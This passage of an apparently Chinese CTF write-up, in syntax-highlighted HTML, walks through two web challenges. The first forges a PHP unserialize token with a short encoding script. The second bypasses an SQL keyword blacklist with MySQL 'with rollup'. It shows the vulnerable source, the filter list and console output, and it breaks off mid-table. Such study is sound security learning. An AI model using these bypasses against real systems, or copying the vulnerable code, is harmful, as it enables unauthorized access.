的值</span>\n\n        <span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">db</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">select</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'user=\\''</span><span class=\"token operator\">.</span><span class=\"token function\">mysql_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$login</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span>\n\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$login</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'ichunqiu'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$login</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'unserialize injection!!'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"(╯‵□′)╯︵┴─┴ \"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Location: index.php?error=1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>重点的话有以下几处，分别是输出flag的地方</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$login</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'ichunqiu'</span><span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n          <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这就要求<code>$login[&#39;user&#39;]</code>为<code>ichunqiu</code>，其次就是它的加密</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$requset</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$login</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">gzuncompress</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$requset</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//gzuncompress:进行字符串压缩</span>\n    <span class=\"token comment\">//unserialize: 将已序列化的字符串还原回 PHP 的值</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话我们需要user为一个固定的值，但是它加密了，那该怎么办呢，我们反向加密即可，构造脚本如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'ichunqiu'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$user</span> <span class=\"token operator\">=</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">gzcompress</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>得到值后在session中修改user的值即可</p>\n<h2 id=\"SQL注入-with-rollup绕过\"><a href=\"#SQL注入-with-rollup绕过\" class=\"headerlink\" title=\"SQL注入_with rollup绕过\"></a>SQL注入_with rollup绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uname'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;form action=\"\" method=\"post\">'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;input name=\"uname\" type=\"text\"/>'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;input name=\"pwd\" type=\"text\"/>'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;input type=\"submit\" />'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/form>'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;!--source: source.txt-->'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">AttackFilter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrKey</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$StrValue</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ArrReq</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  \n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrValue</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token comment\">//检测变量是否是数组</span>\n\n        <span class=\"token variable\">$StrValue</span><span class=\"token operator\">=</span><span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrValue</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//返回由数组元素组合成的字符串</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ArrReq</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/is\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$StrValue</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>   \n\n<span class=\"token comment\">//匹配成功一次后就会停止匹配</span>\n\n        <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"水可载舟，亦可赛艇！\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$filter</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span><span class=\"token operator\">=></span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n\n<span class=\"token comment\">//遍历数组</span>\n\n    <span class=\"token function\">AttackFilter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$con</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_connect</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"XXXXXX\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"XXXXXX\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"XXXXXX\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Could not connect: '</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysql_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"XXXXXX\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">mysql_select_db</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$con</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//设置活动的 MySQL 数据库</span>\n\n<span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"SELECT * FROM interest WHERE uname = '<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uname'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span>'\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n\n<span class=\"token comment\">//执行一条 MySQL 查询</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysql_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n\n<span class=\"token comment\">//返回结果集中行的数目</span>\n\n    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pwd'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"CTF&#123;XXXXXX&#125;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"亦可赛艇！\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"一颗赛艇！\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">mysql_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>重点在于过滤处</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$filter</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span><span class=\"token operator\">=></span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n\n<span class=\"token comment\">//遍历数组</span>\n\n    <span class=\"token function\">AttackFilter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>以及返回flag处</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"SELECT * FROM interest WHERE uname = '<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uname'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span>'\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n\n<span class=\"token comment\">//执行一条 MySQL 查询</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysql_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n\n<span class=\"token comment\">//返回结果集中行的数目</span>\n\n    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pwd'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"CTF&#123;XXXXXX&#125;\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话可以看出是要求通过用户名查询处的密码与post上传的密码一致时才会输出flag，查看过WP后了解到<code>with rollup</code>这个东西，在mysql命令行中测试如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mysql<span class=\"token operator\">></span> select <span class=\"token operator\">*</span> from users group by id with rollup<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">id</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">username</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">password</span>   <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Dumb</span>     <span class=\"token operator\">|</span> <span class=\"token class-name\">Dumb</span>       <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Angelina</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">I</span><span class=\"token operator\">-</span>kill<span class=\"token operator\">-</span><span class=\"token class-name\">you</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Dummy</span>    <span class=\"token operator\">|</span> <span class=\"token class-name\">p</span>@<span class=\"token class-name\">ssword</span>   <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">secure</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">crappy</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">stupid</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">stupidity</span>  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">superman</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">genious</span>    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">7</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">batman</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">mob</span><span class=\"token operator\">!</span><span class=\"token class-name\">le</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">8</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin</span>    <span class=\"token operator\">|</span> <span class=\"token class-name\">admin</span>      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">9</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin1</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin1</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">10</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin2</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin2</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">11</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin3</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin3</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">12</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">dhakkan</span>  <span class=\"token operator\">|</span> <span class=\"token class-name\">dumbo</span>      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">14</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin4</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin4</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token keyword type-declaration\">NULL</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin4</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin4</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token number\">14</span> rows in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现此时最后一个id是Null，这个算是它的一个特点吧，它自动往后多添了一行，把你group by 的那个变量设为空，其他的变量延续上一个值的，那么我们这里当把查询语句中的id变为password会发生什么呢</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mysql<span class=\"token operator\">></span> select <span class=\"token operator\">*</span> from users group by password with rollup <span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">id</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">username</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">password</span>   <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">9</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin1</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin1</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">10</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin2</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin2</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">11</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin3</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin3</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">14</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin4</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin4</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">secure</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">crappy</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Dumb</span>     <span class=\"token operator\">|</span> <span class=\"token class-name\">Dumb</span>       <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">12</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">dhakkan</span>  <span 